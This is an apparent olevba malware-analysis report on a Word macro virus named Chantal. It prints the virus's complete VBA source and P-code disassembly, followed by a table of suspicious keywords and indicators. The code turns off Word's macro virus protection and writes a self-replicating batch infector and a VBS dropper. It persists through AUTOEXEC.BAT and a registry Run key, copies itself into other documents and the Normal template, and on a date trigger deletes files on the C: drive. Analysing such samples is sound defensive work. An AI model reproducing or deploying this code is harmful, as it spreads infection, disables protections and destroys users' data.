olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chantal
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chantal - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()


On Error Resume Next
Application.ShowVisualBasicEditor = False
CommandBars("Tools").Controls("macro").Enabled = False
Options.SaveNormalPrompt = False
Application.EnableCancelKey = False
Options.VirusProtection = False
DisableAutoMacros = False
Options.ConfirmConversions = False
ScreeenUpdate = False
ToolsOptionsSave.AutoSave = False
ToolsOptionsSave.GlobalDotPrompt = False
f = FreeFile
Open "c:\windows\system\CB1999.vbs" For Output As #f
Print #f, "Set CB = WScript.CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #f, "CB.Options.VirusProtection = False"
Print #f, "CB.Options.SaveNormalPrompt = False"
Print #f, "CB.Options.SaveNormalPrompt = False"
Print #f, "CB.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, CB.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines"
Print #f, "CB.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (" & Chr(34) & "C:\WINDOWS\CB4.vxd" & Chr(34) & ")"
Print #f, "CB.Application.Quit"
Close #f
f = FreeFile
Open "c:\CB2.BAT" For Output As #f
Print #f, "@echo off%[CB2_B]%"
Print #f, "IF '%1=='## GOTO CB2_%2"
Print #f, "ATTRIB C:\CB2.BAT +h"
Print #f, "IF EXIST C:\CB2.BAT GOTO CB2_"
Print #f, "IF NOT EXIST %0.BAT GOTO CB2_END"
Print #f, "FIND " & Chr(34) & "CB2" & Chr(34) & "<%0.BAT>C:\CB2.BAT"
Print #f, ":CB2_"
Print #f, "COMMAND /e:5000 /c C:\CB2 ## RUN"
Print #f, "GOTO CB2_END"
Print #f, ":CB2_RUN"
Print #f, "FOR %%i IN (*.bat ..\*.bat) DO CALL C:\CB2 ## INF %%i"
Print #f, "EXIT CB2"
Print #f, ":CB2_INF"
Print #f, "IF '%CB2%=='1111111111111 EXIT"
Print #f, "SET CB2=%CB2%1"
Print #f, "FIND " & Chr(34) & "CB2" & Chr(34) & "<%3>NUL"
Print #f, "IF NOT ERRORLEVEL 1 goto CB2_END"
Print #f, "TYPE %3>CB2"
Print #f, "TYPE C:\CB2.BAT>>CB2"
Print #f, "MOVE CB2 %3>NUL"
Print #f, "EXIT CB2"
Print #f, ":CB2_END"
Close #f
f = FreeFile
Open "C:\AUTOEXEC.BAT" For Input As #f
Do Until EOF(f)
Input #f, ASD
If ASD = "@CB2.BAT" Then GoTo FDBAT
Loop
Close
f = FreeFile
Open "C:\AUTOEXEC.BAT" For Input As #f
K = FreeFile
Open "C:\AUTOEXEC.TMP" For Output As #K
Do Until EOF(f)
Input #f, ASD
Print #K, ASD
Loop
Print #K, "@CB2.BAT"
Close
Kill "AUTOEXEC.BAT"
Name "AUTOEXEC.TMP" As "AUTOEXEC.BAT"
FDBAT:
Close
System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Chantal 4ever!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "Version") = "CB1999"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "CB") = "C:\WINDOWS\SYSTEM\CB1999.vbs"
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
If Year(Now) = 2000 Then Kill "c:\*.*": Kill "*.*": MsgBox "Chantal B. 4ever!", 0, "Mark says..."
If Day(Now) = 31 Then
Assistant.Visible = True
With Assistant.NewBalloon
    .Animation = msoAnimationListensToComputer
    .Button = msoButtonSetOK
    .Heading = "Mark says..."
    .Text = "Chantal B. 4ever!"
    .Show
End With
End If

    If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
        For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
            lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
         Next I
        If (Not ActiveDocument.ReadOnly) Then
            ActiveDocument.SaveAs AddToRecentFiles:=False
        End If
        
            
    ElseIf Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000, False, False) Then
            For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
                lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
                NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
            Next I
            NormalTemplate.Save
    Else
    End If
NormalTemplate.VBProject.VBComponents.Item(1).export ("c:\windows\system\CB4.tmp")
f = FreeFile
Open "c:\windows\system\CB4.tmp" For Input As #f
j = FreeFile
Open "c:\windows\CB4.vxd" For Output As #j
For a = 1 To 8: Input #f, b: Next
Do Until EOF(f)
Input #f, b
Print #j, b
Loop
Close #j
Close #f
Kill "c:\windows\system\CB4.tmp"
Y2KEnd:
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "CHANTAL B. 4ever - Hennie & Mark"
            .Execute
        End With
NormalTemplate.Save
ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Chantal - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Chantal
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 14665 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' Line #2:
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #5:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	St DisableAutoMacros 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #11:
' 	LitVarSpecial (False)
' 	St ScreeenUpdate 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld ToolsOptionsSave 
' 	MemSt AutoSave 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld ToolsOptionsSave 
' 	MemSt GlobalDotPrompt 
' Line #14:
' 	Ld Friend 
' 	St False 
' Line #15:
' 	LitStr 0x001C "c:\windows\system\CB1999.vbs"
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #16:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "Set CB = WScript.CreateObject("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Word.Application"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #17:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "CB.Options.VirusProtection = False"
' 	PrintItemNL 
' Line #18:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "CB.Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #19:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "CB.Options.SaveNormalPrompt = False"
' 	PrintItemNL 
' Line #20:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0089 "CB.normaltemplate.vbproject.vbcomponents(1).codemodule.DeleteLines 1, CB.normaltemplate.vbproject.vbcomponents(1).codemodule.CountOfLines"
' 	PrintItemNL 
' Line #21:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0049 "CB.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0012 "C:\WINDOWS\CB4.vxd"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	PrintItemNL 
' Line #22:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "CB.Application.Quit"
' 	PrintItemNL 
' Line #23:
' 	Ld False 
' 	Sharp 
' 	Close 0x0001 
' Line #24:
' 	Ld Friend 
' 	St False 
' Line #25:
' 	LitStr 0x000A "c:\CB2.BAT"
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #26:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "@echo off%[CB2_B]%"
' 	PrintItemNL 
' Line #27:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "IF '%1=='## GOTO CB2_%2"
' 	PrintItemNL 
' Line #28:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "ATTRIB C:\CB2.BAT +h"
' 	PrintItemNL 
' Line #29:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "IF EXIST C:\CB2.BAT GOTO CB2_"
' 	PrintItemNL 
' Line #30:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "IF NOT EXIST %0.BAT GOTO CB2_END"
' 	PrintItemNL 
' Line #31:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "FIND "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 "CB2"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0012 "<%0.BAT>C:\CB2.BAT"
' 	Concat 
' 	PrintItemNL 
' Line #32:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 ":CB2_"
' 	PrintItemNL 
' Line #33:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "COMMAND /e:5000 /c C:\CB2 ## RUN"
' 	PrintItemNL 
' Line #34:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "GOTO CB2_END"
' 	PrintItemNL 
' Line #35:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 ":CB2_RUN"
' 	PrintItemNL 
' Line #36:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "FOR %%i IN (*.bat ..\*.bat) DO CALL C:\CB2 ## INF %%i"
' 	PrintItemNL 
' Line #37:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "EXIT CB2"
' 	PrintItemNL 
' Line #38:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 ":CB2_INF"
' 	PrintItemNL 
' Line #39:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "IF '%CB2%=='1111111111111 EXIT"
' 	PrintItemNL 
' Line #40:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "SET CB2=%CB2%1"
' 	PrintItemNL 
' Line #41:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "FIND "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 "CB2"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "<%3>NUL"
' 	Concat 
' 	PrintItemNL 
' Line #42:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "IF NOT ERRORLEVEL 1 goto CB2_END"
' 	PrintItemNL 
' Line #43:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "TYPE %3>CB2"
' 	PrintItemNL 
' Line #44:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "TYPE C:\CB2.BAT>>CB2"
' 	PrintItemNL 
' Line #45:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "MOVE CB2 %3>NUL"
' 	PrintItemNL 
' Line #46:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "EXIT CB2"
' 	PrintItemNL 
' Line #47:
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 ":CB2_END"
' 	PrintItemNL 
' Line #48:
' 	Ld False 
' 	Sharp 
' 	Close 0x0001 
' Line #49:
' 	Ld Friend 
' 	St False 
' Line #50:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #51:
' 	Ld False 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #52:
' 	Ld False 
' 	Sharp 
' 	Input 
' 	Ld ASD 
' 	InputItem 
' 	InputDone 
' Line #53:
' 	Ld ASD 
' 	LitStr 0x0008 "@CB2.BAT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo FDBAT 
' 	EndIf 
' Line #54:
' 	Loop 
' Line #55:
' 	CloseAll 
' Line #56:
' 	Ld Friend 
' 	St False 
' Line #57:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #58:
' 	Ld Friend 
' 	St K 
' Line #59:
' 	LitStr 0x000F "C:\AUTOEXEC.TMP"
' 	Ld K 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #60:
' 	Ld False 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #61:
' 	Ld False 
' 	Sharp 
' 	Input 
' 	Ld ASD 
' 	InputItem 
' 	InputDone 
' Line #62:
' 	Ld K 
' 	Sharp 
' 	PrintChan 
' 	Ld ASD 
' 	PrintItemNL 
' Line #63:
' 	Loop 
' Line #64:
' 	Ld K 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "@CB2.BAT"
' 	PrintItemNL 
' Line #65:
' 	CloseAll 
' Line #66:
' 	LitStr 0x000C "AUTOEXEC.BAT"
' 	ArgsCall Kill 0x0001 
' Line #67:
' 	LitStr 0x000C "AUTOEXEC.TMP"
' 	LitStr 0x000C "AUTOEXEC.BAT"
' 	Name 
' Line #68:
' 	Label FDBAT 
' Line #69:
' 	CloseAll 
' Line #70:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #71:
' 	LitStr 0x000E "Chantal 4ever!"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #72:
' 	LitStr 0x0006 "CB1999"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0007 "Version"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #73:
' 	LitStr 0x001C "C:\WINDOWS\SYSTEM\CB1999.vbs"
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0002 "CB"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #74:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #75:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #76:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D0 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "c:\*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "*.*"
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Chantal B. 4ever!"
' 	LitDI2 0x0000 
' 	LitStr 0x000C "Mark says..."
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #79:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	IfBlock 
' Line #80:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #81:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #82:
' 	Ld msoAnimationListensToComputer 
' 	MemStWith Animation 
' Line #83:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #84:
' 	LitStr 0x000C "Mark says..."
' 	MemStWith Heading 
' Line #85:
' 	LitStr 0x0011 "Chantal B. 4ever!"
' 	MemStWith Then 
' Line #86:
' 	ArgsMemCallWith Show 0x0000 
' Line #87:
' 	EndWith 
' Line #88:
' 	EndIfBlock 
' Line #89:
' Line #90:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #91:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #92:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #93:
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #94:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	Not 
' 	Paren 
' 	IfBlock 
' Line #96:
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #97:
' 	EndIfBlock 
' Line #98:
' Line #99:
' Line #100:
' 	LitStr 0x000D "Document_Open"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	ElseIfBlock 
' Line #101:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #102:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #103:
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #104:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #106:
' 	ElseBlock 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	LitStr 0x0019 "c:\windows\system\CB4.tmp"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall export 0x0001 
' Line #109:
' 	Ld Friend 
' 	St False 
' Line #110:
' 	LitStr 0x0019 "c:\windows\system\CB4.tmp"
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #111:
' 	Ld Friend 
' 	St j 
' Line #112:
' 	LitStr 0x0012 "c:\windows\CB4.vxd"
' 	Ld j 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #113:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	For 
' 	BoS 0x0000 
' 	Ld False 
' 	Sharp 
' 	Input 
' 	Ld B 
' 	InputItem 
' 	InputDone 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #114:
' 	Ld False 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #115:
' 	Ld False 
' 	Sharp 
' 	Input 
' 	Ld B 
' 	InputItem 
' 	InputDone 
' Line #116:
' 	Ld j 
' 	Sharp 
' 	PrintChan 
' 	Ld B 
' 	PrintItemNL 
' Line #117:
' 	Loop 
' Line #118:
' 	Ld j 
' 	Sharp 
' 	Close 0x0001 
' Line #119:
' 	Ld False 
' 	Sharp 
' 	Close 0x0001 
' Line #120:
' 	LitStr 0x0019 "c:\windows\system\CB4.tmp"
' 	ArgsCall Kill 0x0001 
' Line #121:
' 	Label Y2KEnd 
' Line #122:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #123:
' 	LitStr 0x0020 "CHANTAL B. 4ever - Hennie & Mark"
' 	MemStWith Comments 
' Line #124:
' 	ArgsMemCallWith Execute 0x0000 
' Line #125:
' 	EndWith 
' Line #126:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #127:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #128:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|CALL                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|vbproject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |CB1999.vbs          |Executable file name                         |
|IOC       |CB2.BAT             |Executable file name                         |
|IOC       |0.BAT               |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

